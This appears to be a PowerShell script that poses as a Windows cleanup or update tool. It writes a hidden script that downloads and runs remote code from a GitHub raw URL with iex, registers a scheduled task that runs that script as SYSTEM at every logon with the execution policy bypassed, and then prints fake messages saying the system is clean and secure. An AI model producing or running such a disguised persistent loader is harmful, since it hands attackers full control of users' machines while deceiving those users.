mkdir "C:\configWin" | out-null
mkdir "C:\configWin\assets" | out-null

$contenuto = @'
iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null
'@

$contenuto | Out-File "C:\configWin\assets\configSys.ps1"

$scriptPath = "C:\configWin\assets\configSys.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal | out-null

Write-Host "############################################# CHECK UPDATE ###############################################" -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "34 ACTIVITIES TO CLEAN UP" -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "SYSTEM CLEAN AND SECURE" -ForegroundColor "Green"
